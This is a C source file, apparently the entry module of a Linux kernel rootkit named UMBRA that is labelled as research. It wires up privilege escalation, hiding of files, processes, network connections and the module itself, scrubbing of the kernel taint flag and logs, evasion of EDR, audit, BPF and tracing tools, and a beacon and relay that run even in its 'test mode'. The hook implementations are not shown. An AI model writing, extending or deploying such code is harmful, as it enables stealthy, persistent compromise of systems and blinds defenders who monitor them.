#include "include/ub_core.h"
#include "include/reset_tainted.h"
#include "include/become_root.h"
#include "include/hiding_directory.h"
#include "include/hiding_stat.h"
#include "include/hiding_tcp.h"
#include "include/hooks_write.h"
#include "include/clear_taint_dmesg.h"
#include "include/hiding_chdir.h"
#include "include/hiding_readlink.h"
#include "include/hide_module.h"
#include "include/open.h"
#include "include/bpf_hook.h"
#include "include/relay.h"
#include "include/trace.h"
#include "include/audit.h"
#include "include/task.h"
#include "include/edr_evade.h"
#include "include/sysrq_hook.h"
#include "include/armor.h"
#include "include/beacon.h"

static void ub_armor_snapshot_all(void)
{
    ub_armor_protect_symbol("__x64_sys_getdents");
    ub_armor_protect_symbol("__x64_sys_getdents64");

    ub_armor_protect_symbol("__x64_sys_stat");
    ub_armor_protect_symbol("__x64_sys_lstat");
    ub_armor_protect_symbol("__x64_sys_newstat");
    ub_armor_protect_symbol("__x64_sys_newlstat");
    ub_armor_protect_symbol("__x64_sys_statx");
    ub_armor_protect_symbol("__x64_sys_newfstatat");
    ub_armor_protect_symbol("__x64_sys_getpriority");

    ub_armor_protect_symbol("__x64_sys_openat");

    ub_armor_protect_symbol("__x64_sys_readlinkat");
    ub_armor_protect_symbol("__x64_sys_readlink");

    ub_armor_protect_symbol("__x64_sys_chdir");

    ub_armor_protect_symbol("__x64_sys_read");
    ub_armor_protect_symbol("__x64_sys_pread64");
    ub_armor_protect_symbol("__x64_sys_readv");
    ub_armor_protect_symbol("__x64_sys_preadv");
    ub_armor_protect_symbol("do_syslog");
    ub_armor_protect_symbol("sched_debug_show");

    ub_armor_protect_symbol("__x64_sys_write");
    ub_armor_protect_symbol("__x64_sys_writev");
    ub_armor_protect_symbol("__x64_sys_pwrite64");
    ub_armor_protect_symbol("__x64_sys_pwritev");
    ub_armor_protect_symbol("__x64_sys_pwritev2");
    ub_armor_protect_symbol("__x64_sys_sendfile");
    ub_armor_protect_symbol("__x64_sys_sendfile64");
    ub_armor_protect_symbol("__x64_sys_copy_file_range");
    ub_armor_protect_symbol("__x64_sys_splice");
    ub_armor_protect_symbol("__x64_sys_vmsplice");
    ub_armor_protect_symbol("__x64_sys_tee");
    ub_armor_protect_symbol("__x64_sys_io_uring_enter");

    ub_armor_protect_symbol("__x64_sys_kill");
    ub_armor_protect_symbol("__x64_sys_getsid");
    ub_armor_protect_symbol("__x64_sys_getpgid");
    ub_armor_protect_symbol("__x64_sys_getpgrp");
    ub_armor_protect_symbol("__x64_sys_sched_getaffinity");
    ub_armor_protect_symbol("__x64_sys_sched_getparam");
    ub_armor_protect_symbol("__x64_sys_sched_getscheduler");
    ub_armor_protect_symbol("__x64_sys_sched_rr_get_interval");
    ub_armor_protect_symbol("__x64_sys_sysinfo");
    ub_armor_protect_symbol("__x64_sys_pidfd_open");

    ub_armor_protect_symbol("tcp4_seq_show");
    ub_armor_protect_symbol("tcp6_seq_show");
    ub_armor_protect_symbol("udp4_seq_show");
    ub_armor_protect_symbol("udp6_seq_show");
    ub_armor_protect_symbol("tpacket_rcv");

    ub_armor_protect_symbol("__x64_sys_recvmsg");
    ub_armor_protect_symbol("__x64_sys_recvfrom");
    ub_armor_protect_symbol("netlink_unicast");
    ub_armor_protect_symbol("audit_log_start");

    ub_armor_protect_symbol("__x64_sys_bpf");
    ub_armor_protect_symbol("bpf_iter_run_prog");
    ub_armor_protect_symbol("bpf_seq_write");
    ub_armor_protect_symbol("bpf_seq_printf");
    ub_armor_protect_symbol("bpf_ringbuf_output");
    ub_armor_protect_symbol("bpf_ringbuf_reserve");
    ub_armor_protect_symbol("bpf_ringbuf_submit");
    ub_armor_protect_symbol("bpf_map_lookup_elem");
    ub_armor_protect_symbol("bpf_map_update_elem");
    ub_armor_protect_symbol("array_map_update_elem");
    ub_armor_protect_symbol("perf_event_output");
    ub_armor_protect_symbol("perf_trace_run_bpf_submit");
    ub_armor_protect_symbol("__bpf_prog_run");
    ub_armor_protect_symbol("__ia32_sys_bpf");

    ub_armor_protect_symbol("icmp_rcv");

    ub_armor_protect_symbol("taskstats_user_cmd");

    ub_armor_protect_symbol("__x64_sys_access");
    ub_armor_protect_symbol("__x64_sys_faccessat");
    ub_armor_protect_symbol("__x64_sys_faccessat2");

    ub_armor_protect_symbol("__ia32_sys_read");
    ub_armor_protect_symbol("__ia32_sys_write");
    ub_armor_protect_symbol("__ia32_sys_getdents");
    ub_armor_protect_symbol("__ia32_sys_getdents64");
    ub_armor_protect_symbol("__ia32_sys_pwrite64");
    ub_armor_protect_symbol("__ia32_compat_sys_pwrite64");
    ub_armor_protect_symbol("__x64_sys_ia32_pwrite64");
}

int ub_test_mode = 0;
module_param(ub_test_mode, int, 0600);
MODULE_PARM_DESC(ub_test_mode,
                 "1 = observable lab run: no concealment, no guardian, no EDR hooks");

static int __init umbra_boot(void)
{
    int ret = 0;

    pr_info("UMBRA: boot (kernel %u.%u.%u, test_mode=%d)\n",
            LINUX_VERSION_CODE >> 16,
            (LINUX_VERSION_CODE >> 8) & 0xff,
            LINUX_VERSION_CODE & 0xff, ub_test_mode);

    if (!ub_test_mode) {
        ub_armor_protect_symbol("register_kprobe");

        ret = ub_armor_bootstrap_kprobe_hook();
        if (ret) return ret;

        ret = ub_edr_evade_start();
        if (ret) return ret;

        ub_armor_snapshot_all();

        ret = ub_armor_start();
        if (ret) return ret;
    }

    /* Relay and beacon are active in both modes: they are what we test. */
    ret |= ub_relay_start();
    ret |= ub_beacon_start();

    if (!ub_test_mode) {
        ret |= ub_taintwash_start();
        ret |= ub_visor_start();
        ret |= ub_privilege_start();
        ret |= ub_veil_start();
        ret |= ub_statguard_start();
        ret |= ub_netguard_start();
        ret |= ub_logwash_start();
        ret |= ub_writeguard_start();
        ret |= ub_cwdguard_start();
        ret |= ub_linkguard_start();
        ret |= ub_bpfguard_start();
        ret |= ub_traceguard_start();
        ret |= ub_auditguard_start();
        ret |= ub_taskguard_start();
        ret |= ub_sysrqguard_start();

        ub_module_conceal_deferred();
    }

    return ret;
}

static void __exit umbra_halt(void)
{
    ub_beacon_stop();
    ub_relay_stop();

    if (ub_test_mode)
        return;

    ub_module_conceal_cancel();
    ub_sysrqguard_stop();
    ub_taskguard_stop();
    ub_auditguard_stop();
    ub_traceguard_stop();
    ub_bpfguard_stop();
    ub_linkguard_stop();
    ub_cwdguard_stop();
    ub_writeguard_stop();
    ub_logwash_stop();
    ub_netguard_stop();
    ub_statguard_stop();
    ub_veil_stop();
    ub_privilege_stop();
    ub_visor_stop();
    ub_taintwash_stop();
    ub_armor_stop();
    ub_edr_evade_stop();
}

module_init(umbra_boot);
module_exit(umbra_halt);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("UMBRA Research");
MODULE_DESCRIPTION("UMBRA: kernel-residency research");
